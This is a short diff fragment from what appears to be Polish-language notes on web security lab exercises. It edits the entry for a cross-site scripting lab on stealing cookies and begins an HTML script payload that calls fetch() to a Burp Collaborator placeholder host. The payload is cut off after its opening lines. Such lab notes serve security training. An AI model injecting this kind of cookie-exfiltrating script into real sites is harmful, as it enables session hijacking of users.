@@ -17,8 +17,8 @@ Hackvertor
 2. Logujemy się jako administrator
 
 ## Cross-site scripting
-### Exploiting cross-site scripting to steal cookies
-1. Exploit server:
+### \[PRO\] Exploiting cross-site scripting to steal cookies
+1. Komentarz:
 ```html
 <script>
 fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
